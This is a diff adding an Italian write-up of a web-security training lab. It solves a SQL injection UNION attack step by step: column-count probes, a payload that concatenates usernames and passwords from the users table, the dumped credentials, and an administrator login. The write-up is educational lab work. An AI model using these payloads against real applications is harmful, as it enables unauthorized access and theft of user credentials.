@@ -1,0 +1,53 @@
+Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+📝 Descrizione
+L’applicazione web presenta una vulnerabilità di SQL injection nel parametro category, utilizzato per filtrare i prodotti mostrati.
+Poiché i risultati della query vengono restituiti nella risposta HTTP, è possibile sfruttare un attacco di tipo UNION SELECT per estrarre dati da tabelle differenti.
+Nel database è presente una tabella users contenente i campi username e password.
+
+A differenza di altri lab simili, qui la query originale restituisce due colonne, ma solo una di esse accetta valori di tipo testo, quindi i dati username e password devono essere combinati in un’unica colonna.
+
+⚙️ Passaggi eseguiti
+1. Intercettazione della richiesta
+Con Burp Suite ho intercettato la richiesta HTTP contenente il parametro vulnerabile:
+
+GET /filter?category=Accessories HTTP/1.1
+
+Host: <lab>.web-security-academy.net
+
+2. Determinazione del numero e tipo di colonne
+Per verificare il numero di colonne e quali accettano dati testuali, ho testato vari payload UNION:
+
+Test 1: ' UNION SELECT NULL--
+→ Errore: numero insufficiente di colonne
+
+Test 2: ' UNION SELECT NULL,NULL--
+→ Funziona: conferma che la query restituisce due colonne
+
+Test 3: ' UNION SELECT NULL,'abc'--
+→ "abc" compare nella pagina: conferma che solo la seconda colonna accetta valori testuali.
+
+🧠 Ragionamento tecnico
+Poiché possiamo mostrare solo una colonna testuale, ma abbiamo bisogno di mostrare due valori (username e password), dobbiamo concatenarli in un'unica stringa.
+Per farlo, possiamo utilizzare l'operatore di concatenazione del DB: ||.
+
+username || '~' || password
+
+In questo modo, username e password saranno uniti con un simbolo separatore (~) per distinguerli facilmente.
+
+3. Estrazione dei dati dalla tabella users
+Ho iniettato il seguente payload nel parametro category:
+
+' UNION SELECT NULL, username || '~' || password FROM users--
+
+Questo ha permesso di visualizzare nella pagina stringhe come:
+
+administrator~P@ssw0rd
+carlos~qwerty123
+
+4. Login come administrator
+Ho copiato la password associata all’utente administrator e l’ho utilizzata nella pagina di login dell’applicazione.
+L’accesso ha avuto successo e il lab è stato marcato come risolto.
+
+✅ Soluzione finale 
+Payload usato:' UNION SELECT NULL, username || '~' || password FROM users--
